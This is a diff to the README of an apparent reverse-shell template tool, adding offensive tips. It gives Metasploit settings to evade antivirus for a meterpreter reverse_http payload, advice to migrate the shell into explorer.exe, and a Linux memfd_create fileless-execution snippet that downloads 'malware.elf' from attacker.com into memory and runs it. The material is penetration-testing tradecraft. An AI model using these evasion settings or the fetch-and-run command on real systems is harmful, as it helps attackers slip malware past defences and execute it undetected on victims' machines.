@@ -17,6 +17,24 @@ To interactively select and render one of the many templates run `./make.py`.
 
 ## Tips
 
+### Metasploit
+
+List available payload formats with `msfvenom --list formats`.
+
+Payloads like `windows/shell_reverse_tcp` are one of the few reverse shells for Windows that support interactive commands.
+
+Evade basic AV detection with `windows/meterpreter/reverse_http` ([source](https://twitter.com/lpha3ch0/status/1630213398397874178)):
+
+~~~
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set AutoLoadStdapi false
+~~~
+
+After you received the meterpreter shell run `load stdapi`.
+
+When your shell terminates shortly after you receive the connection run `migrate -N explorer.exe` in the meterpreter shell or `set AutoRunScript post/windows/manage/migrate` for the handler.
+
 ### Linux PTY
 
 Spawn a PTY and stabilize your shell.
@@ -40,11 +58,17 @@ Alternate technique to spawn a PTY.
 script -q -c /bin/bash /dev/null
 ~~~
 
-### msfvenom
+### Linux memfd_create()
 
-List available payload formats with `msfvenom --list formats`.
+Create file in memory with Python 3.8 or newer ([source](https://twitter.com/David3141593/status/1629691758563975168)).
 
-On Windows:
+~~~ python
+import os
+os.fork() or (os.setsid(), print(f'/proc/{os.getpid()}/fd/{os.memfd_create(str())}'), os.kill(os.getpid(), 19))
+~~~
 
-`windows/shell_reverse_tcp` is one of the few reverse shells that support interactive commands on Windows.
-When your reverse shell terminates shortly after you receive the connection try setting `AutoRunScript=post/windows/manage/migrate` to run the reverse shell from a separate process.
+~~~ bash
+path="$(python3 -c "from os import*;fork()or(setsid(),print(f'/proc/{getpid()}/fd/{memfd_create(sep)}'),kill(0,19))")"
+curl -o $path https://attacker.com/malware.elf
+$path
+~~~
